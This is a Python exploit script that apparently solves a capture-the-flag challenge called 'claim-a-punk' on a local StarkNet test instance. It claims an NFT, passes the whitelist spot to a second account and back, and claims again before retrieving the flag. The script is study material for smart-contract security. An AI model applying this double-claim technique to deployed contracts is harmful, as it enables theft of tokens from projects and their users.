import asyncio
import logging


from starknet_py.contract import Contract
from starknet_py.net import AccountClient
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.models import StarknetChainId

from common import utils

logger = utils.setup_logger("claim-a-punk")

    
async def main(hostname='127.0.0.1', port=31337):
    ctx = await utils.get_context(hostname, port, start_instance=utils.start_instance_docker_exec)
    contract = ctx["contract"]
    acc_client = ctx["acc_client"]
    contract_address = ctx["contract_address"]

    # attack
    bob_client = await AccountClient.create_account(
        acc_client.client,
        chain=StarknetChainId.TESTNET,
    )

    bob_contract = await Contract.from_address(contract_address, bob_client)

    punks_nft_contract_address = (await contract.functions["getPunksNftAddress"].call()).address
    punks_nft = await Contract.from_address(punks_nft_contract_address, acc_client.client)
    logger.debug("Retrieve balance of player")
    player_nft_balance = (await punks_nft.functions["balanceOf"].call(acc_client.address)).balance
    logger.debug(f"Player balance: {player_nft_balance}")
    
    logger.info("Invoke claim as player")
    invocation = await contract.functions["claim"].invoke(to=acc_client.address, max_fee=int(4e16))
    await invocation.wait_for_acceptance()
    logger.debug("Retrieve balance of player")
    player_nft_balance = (await punks_nft.functions["balanceOf"].call(acc_client.address)).balance
    logger.debug(f"Player balance: {player_nft_balance}")

    logger.info("Invoke transfer whitelist")
    invocation = await contract.functions["transferWhitelistSpot"].invoke(to=bob_client.address, max_fee=int(4e16))
    await invocation.wait_for_acceptance()

    logger.info("Transfer whitelist from Bob")
    invocation = await bob_contract.functions["transferWhitelistSpot"].invoke(to=acc_client.address, max_fee=int(0))
    await invocation.wait_for_acceptance()

    is_white = (await contract.functions["isWhitelisted"].call(address=acc_client.address)).result
    logger.debug(f"Player is white listed?: {is_white}")

    logger.info("Invoke claim as player")
    invocation = await contract.functions["claim"].invoke(to=acc_client.address, max_fee=int(4e16))
    await invocation.wait_for_acceptance()

    logger.debug("Retrieve balance of player")
    player_nft_balance = (await punks_nft.functions["balanceOf"].call(acc_client.address)).balance
    logger.debug(f"Player balance: {player_nft_balance}")

    flag = utils.get_flag(hostname, port)
    logger.info(f"Flag: {flag}")
    return

asyncio.run(main())
